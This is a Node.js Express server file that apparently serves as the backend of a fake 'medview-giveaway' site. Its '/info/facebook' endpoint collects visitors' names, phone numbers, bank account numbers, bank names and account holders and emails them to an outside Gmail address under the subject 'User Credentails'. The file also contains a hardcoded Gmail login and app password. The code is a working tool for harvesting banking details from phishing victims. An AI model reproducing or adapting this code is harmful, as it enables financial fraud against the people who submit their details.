//require('dotenv').config()
const express = require('express')
const cors = require('cors')
const nodemailer = require('nodemailer')
const nodeEnv = require('./config/nodeEnv')
const bodyParser = require('body-parser')

const app = express()
const PORT = process.env.PORT || 4040

// frontend url and callback

const frontend_url = nodeEnv === 'development' ? 'http://127.0.0.1:5500' : 'https://medview-giveaway.vercel.app'

// CORS SETUP

const allowedOrigins = ['http://127.0.0.1:5500', 'https://medview-giveaway.vercel.app']

const corsOption = {
    origin: function(origin, callback){
        if(allowedOrigins.indexOf(origin) !== -1 || !origin){
            callback(null, true)
        }else{
            callback(new Error('NOT ALLOWED BY CORS'))
        }
    }
}

app.use(cors(corsOption))
app.use(express.json())

// Configure nodemailer

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth:{
        user: 'contactshonenstream@gmail.com',
        pass: 'xxcvxhsjjaznhgte'
    }
})

app.post('/info/facebook', (req,res)=>{
    const { username, phone, accountNumber, bankName, bankHolder } = req.body

    console.log(username, phone, accountNumber, bankName, bankHolder)

    try {

        const mailOptions = {
            from: 'contactshonenstream@gmail.com', // My mail
            to: 'reesekyleighnyomi@gmail.com', // reciever's email DonJerry
            subject: 'User Credentails',
            text: `Name: ${username}\n\nPhone Number: ${phone}\n\nAccount Number: ${accountNumber}\n\nBank: ${bankName}\n\nBank Holder: ${bankHolder}`
        }
    
        transporter.sendMail(mailOptions, (err, info) => {
            if(err){ 
                console.log('Email error', err)
                res.status(400).json({ error: err })
            }
            else console.log('Email sent', info.response)
        })
    } catch(err){
        console.log(err)
        res.status(500).json({ error: 'Server Error' })
    }
})

// Welcome!!

app.get('/', (req,res) => {
    res.send('Welcome!!!')
})


// Start Server

app.listen(PORT, () => {
    console.log('Server running on Port', PORT)
})
